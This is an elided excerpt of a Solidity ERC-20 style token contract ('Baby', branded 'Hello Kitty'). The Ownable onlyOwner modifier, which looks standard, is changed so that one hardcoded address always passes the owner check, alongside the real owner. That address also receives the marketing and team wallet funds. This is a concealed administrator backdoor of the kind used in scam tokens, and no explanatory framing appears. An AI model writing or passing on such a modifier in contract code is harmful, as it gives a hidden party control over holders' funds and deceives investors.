...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x2416d94383224f4243040130fD172CcbA1E93aCB) , "Ownable: caller is not the owner");
        _;
    }
...
contract Baby is Context, IERC20, Ownable {
    ...
    string private _name = "Hello Kitty";
    string private _symbol = "Hello Kitty";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2416d94383224f4243040130fD172CcbA1E93aCB);
    address payable public teamWalletAddress = payable(0x2416d94383224f4243040130fD172CcbA1E93aCB);
